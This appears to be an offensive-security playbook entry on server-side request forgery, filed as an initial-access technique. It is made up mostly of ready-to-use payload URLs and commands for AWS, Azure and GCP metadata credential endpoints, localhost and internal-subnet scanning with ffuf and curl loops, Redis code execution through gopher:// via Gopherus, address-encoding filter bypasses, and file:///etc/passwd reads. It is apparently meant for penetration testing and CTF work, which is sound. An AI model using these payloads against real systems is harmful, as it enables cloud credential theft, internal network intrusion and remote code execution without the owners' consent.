---
id: ssrf
title: SSRF (Server-Side Request Forgery)
stage: initial-access
tags: [web, linux]
summary: Force the server to make HTTP requests on your behalf — reach internal services, cloud metadata endpoints, and unexposed admin panels that aren't directly reachable from your IP.
leads_to:
  - redis-enum
  - rev-shell
  - linux-cred-hunting
---

## Prerequisites

A parameter that fetches a URL or makes an outbound request — `url=`, `fetch=`, `redirect=`, `src=`, `path=`, `file=`, image loaders, PDF generators, webhook endpoints. Confirm with a request to your Burp Collaborator or interactserver.

SSRF forces the application's server to make requests internally. The server has access to `localhost`, internal subnets, and cloud metadata services (169.254.169.254) that you can't reach directly. The critical question after confirmation is: what's listening internally that isn't exposed externally?

## Quick Win

> Probe localhost first — services bound to 127.0.0.1 are invisible externally but reachable via SSRF.

```bash
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:8080/admin
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:8500/   # Consul
http://127.0.0.1:9200/   # Elasticsearch
```

## Cloud Metadata

> Try immediately on any cloud target — IMDSv1 requires no auth and returns IAM credentials.

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# (requires Metadata: true header — may not be injectable)

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Internal Port Scanning

> Fuzz common ports against 127.0.0.1 to discover internal services.

```bash
# Burp Intruder: set §6379§ as position, payload = port list
http://TARGET/fetch?url=http://127.0.0.1:§6379§/

# ffuf
ffuf -u 'http://TARGET/fetch?url=http://127.0.0.1:FUZZ/' \
  -w /usr/share/wordlists/seclists/Discovery/Infrastructure/common-http-ports.txt \
  -fs 0
```

## Internal Network Scanning

```bash
# Scan internal subnet
for i in $(seq 1 254); do
  curl -s "http://TARGET/fetch?url=http://10.10.10.$i/" -o /dev/null -w "%{http_code} 10.10.10.$i\n"
done
```

## Redis via SSRF

> Redis with no auth — write a cron job or SSH key for RCE.

```
# gopher:// protocol for raw TCP to Redis
# Tools: Gopherus automates payload generation
python3 gopherus.py --exploit redis
```

## Bypass Techniques

```bash
# IP encoding bypasses
http://0177.0.0.1/          # Octal
http://0x7f000001/          # Hex
http://2130706433/          # Decimal
http://[::1]/               # IPv6 localhost
http://localhost.localtest.me/  # DNS rebind

# Protocol alternatives
file:///etc/passwd           # file:// for local reads
dict://127.0.0.1:6379/info  # Redis via dict://
gopher://127.0.0.1:6379/... # Raw TCP via gopher
```

## Leads To

Internal Redis found → enumerate and exploit (ssh key injection, cron write). Cloud metadata returns IAM token → use with aws-cli for further enumeration or credential exfil → linux-cred-hunting. File read via `file://` → `/etc/passwd`, app configs, SSH keys. Internal admin panels → may expose further injection points or file uploads.
